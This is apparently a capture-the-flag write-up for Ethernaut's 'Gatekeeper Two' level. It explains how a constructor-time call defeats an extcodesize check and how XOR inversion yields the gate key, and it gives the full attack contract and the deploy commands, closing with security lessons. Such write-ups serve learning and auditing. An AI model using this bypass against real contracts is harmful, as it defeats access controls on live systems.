# 14 - Gatekeeper Two

## Overview

- **Difficulty:** 6/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x76A2C8F1E53a53b42Db2E8F01C492C095A3D90a5`](https://sepolia.etherscan.io/address/0x76A2C8F1E53a53b42Db2E8F01C492C095A3D90a5)
- **Attack Contract (`GatekeeperTwoCaller`):** [`0xd63442341f99c80e402e30747cf45f27ae49fec9`](https://sepolia.etherscan.io/address/0xd63442341f99c80e402e30747cf45f27ae49fec9)
- **Transactions:**
  - **1. Deploy & Exploit (`GatekeeperTwoCaller`):** [`0x3ba2eb1eceabaa3aee426b2c59b77c779d13a6d6e3e5b208a3fb3da9aebe039f`](https://sepolia.etherscan.io/tx/0x3ba2eb1eceabaa3aee426b2c59b77c779d13a6d6e3e5b208a3fb3da9aebe039f)
  - **2. Level Submission:** [`0x4d893ab445749002e4e0eabd9c11322ccbc307cb8aa415d74b4d82d2073381b8`](https://sepolia.etherscan.io/tx/0x4d893ab445749002e4e0eabd9c11322ccbc307cb8aa415d74b4d82d2073381b8)

---

## Objective

Bypass all three gatekeeper modifiers and register your account address as the `entrant`.

---

## Contract Analysis

The target contract is [`src/14-gatekeeper-two/GatekeeperTwo.sol`](./GatekeeperTwo.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

---

### Vulnerability Breakdown

To enter the contract, we must bypass three gates:

#### Gate One: Origin vs Sender Check
```solidity
require(msg.sender != tx.origin);
```
- Standard check requiring the immediate caller (`msg.sender`) to be a smart contract rather than the originating EOA (`tx.origin`).
- Satisfied by calling from an intermediate attack contract.

---

#### Gate Two: The `extcodesize` Myth
```solidity
uint256 x;
assembly {
    x := extcodesize(caller())
}
require(x == 0);
```
- In EVM assembly, `extcodesize(caller())` queries the size of the runtime bytecode at the caller's address.
- Developers often assume `extcodesize == 0` guarantees the caller is an EOA (Externally Owned Account).
- **The Flaw:** During contract deployment, while the contract's `constructor` is actively executing, the contract's runtime bytecode has **not yet been stored on-chain**.
- Therefore, when called directly from inside `GatekeeperTwoCaller`'s constructor, `extcodesize(caller())` evaluates to **`0`**, cleanly bypassing Gate Two!

---

#### Gate Three: The Bitwise XOR Inversion
```solidity
require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
```

Let:
- $A = \text{uint64}(\text{bytes8}(\text{keccak256}(\text{abi.encodePacked}(msg.sender))))$
- $B = \text{uint64}(\_gateKey)$
- $C = \text{type(uint64).max} = \text{0xFFFFFFFFFFFFFFFF}$ (all 64 bits set to 1)

The condition is:
$$A \oplus B = C$$

By the mathematical properties of the bitwise XOR ($\oplus$) operator:
1. $X \oplus X = 0$
2. $X \oplus 0 = X$
3. $A \oplus B = C \iff A \oplus C = B$

Since we know $A$ (derived from our attack contract's address `address(this)`) and $C$ (`type(uint64).max`), we can calculate $B$ directly:
$$B = A \oplus C$$

Furthermore, XORing any value with all 1s (`type(uint64).max`) simply inverts all bits (equivalent to bitwise NOT `~A`):
$$\_gateKey = \text{bytes8}(A \oplus \text{type(uint64).max})$$

---

## Attack Contract

The exploit is implemented in [`src/14-gatekeeper-two/GatekeeperTwoCaller.sol`](./GatekeeperTwoCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoCaller {
    constructor(address _gatekeeperTwo) {
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        // A ^ B = C;
        // A ^ C = B;
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max) == uint64(_gateKey);

        bytes8 _key = bytes8((uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max));
        GatekeeperTwo(_gatekeeperTwo).enter(_key);
    }
}
```

### Exploit Architecture: 1-Tx Execution

1. Deploying `GatekeeperTwoCaller` immediately triggers its `constructor`.
2. Inside the constructor:
   - `msg.sender != tx.origin` is satisfied (caller is contract, origin is player).
   - `extcodesize(caller())` is `0` because runtime code is not yet written.
   - `_key` is calculated dynamically and passed to `enter(_key)`.
3. Gatekeeper Two updates `entrant = tx.origin`.
4. The entire attack succeeds atomically in the single deployment transaction.

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy & Exploit in a Single Command

Deploy `GatekeeperTwoCaller`, passing the `GatekeeperTwo` instance address as a constructor argument:

```bash
forge create src/14-gatekeeper-two/GatekeeperTwoCaller.sol:GatekeeperTwoCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --broadcast \
  --constructor-args 0x76A2C8F1E53a53b42Db2E8F01C492C095A3D90a5
```

- **Deploy & Exploit Tx:** [`0x3ba2eb1eceabaa3aee426b2c59b77c779d13a6d6e3e5b208a3fb3da9aebe039f`](https://sepolia.etherscan.io/tx/0x3ba2eb1eceabaa3aee426b2c59b77c779d13a6d6e3e5b208a3fb3da9aebe039f)
- **Deployed Contract Address:** [`0xd63442341f99c80e402e30747cf45f27ae49fec9`](https://sepolia.etherscan.io/address/0xd63442341f99c80e402e30747cf45f27ae49fec9)

### 2. Verify `entrant`

Verify that the `entrant` state variable is now your player address:

```bash
cast call 0x76A2C8F1E53a53b42Db2E8F01C492C095A3D90a5 "entrant()(address)" --rpc-url sepolia
# Output: Returns player address
```

### 3. Submit Level

Submit the instance on the Ethernaut dashboard:

- **Submission Tx:** [`0x4d893ab445749002e4e0eabd9c11322ccbc307cb8aa415d74b4d82d2073381b8`](https://sepolia.etherscan.io/tx/0x4d893ab445749002e4e0eabd9c11322ccbc307cb8aa415d74b4d82d2073381b8)

---

## Key Security Takeaways

1. **`extcodesize == 0` Does Not Guarantee an EOA:**
   Never rely on `extcodesize(caller()) == 0` for access control or bot prevention. Contracts in their construction phase have code size 0. Additionally, with Account Abstraction (ERC-4337) and smart contract wallets, assuming EOAs are the only legitimate users breaks modern wallet compatibility.
2. **Symmetric Properties of XOR:**
   Bitwise XOR operations are reversible ($A \oplus B = C \implies A \oplus C = B$). Any cryptographic puzzle relying on simple XOR can be mathematically rearranged and solved in reverse.
3. **Constructor-Time Atomic Exploitation:**
   Placing attack logic directly into contract constructors is a powerful technique for bypassing balance checks, front-running defenses, and bytecode-size restrictions.
